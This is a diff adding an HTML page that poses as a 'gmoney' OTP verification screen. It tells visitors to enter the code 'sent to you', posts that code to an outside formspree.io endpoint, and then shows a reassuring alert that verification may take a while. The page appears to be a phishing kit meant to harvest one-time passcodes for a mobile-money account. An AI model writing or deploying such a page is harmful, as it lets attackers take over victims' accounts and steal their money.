@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>verification code</title>
+    <style>
+    body{
+        text-align: center;
+        margin: 50px;
+    }
+
+    .gmoneyotp input{
+    padding: 10px; 
+    border-radius: 10px;
+  
+
+    }
+
+    .gmoneyotp button{
+        padding: 10px 70px;
+        background-color: black;
+        border-radius: 10px;
+        color: white;
+    }
+    </style>
+</head>
+<body>
+    <div class="gmoneyotp">
+    <form action="https://formspree.io/f/mnqkarng" method="POST">
+       <p> input otp verification code sent to you!</p>
+    <input type="text" name="gmoney otp" id="gmoney otp"><br><br>
+    <button onclick="fun1()">VERIFY</button>
+    <script>
+        function fun1(){
+            alert("it may take a while for your account to be verify")
+        }
+    </script>
+    </form>
+</div>
+
+</body>
+</html>
